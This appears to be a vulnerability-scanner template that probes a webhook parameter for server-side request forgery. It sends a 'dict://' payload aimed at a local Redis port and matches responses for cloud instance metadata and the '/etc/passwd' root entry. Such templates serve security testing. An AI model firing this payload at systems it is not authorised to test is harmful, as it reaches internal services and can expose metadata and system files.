id: ssrf-010
name: 'SSRF via webhook'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via webhook (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      webhook:
        - 'dict://127.0.0.1:6379/info'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
